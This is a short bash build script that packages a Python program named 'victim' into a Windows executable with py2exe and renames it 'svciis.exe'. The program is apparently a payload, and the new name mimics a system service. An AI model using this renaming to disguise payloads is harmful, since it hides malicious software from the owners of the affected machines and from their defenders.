#!/bin/bash

rm -Rf dist/
python3 -OO setup.py py2exe --bundle 2
#python3 -OO setup.py py2exe
mv dist/victim.exe dist/svciis.exe
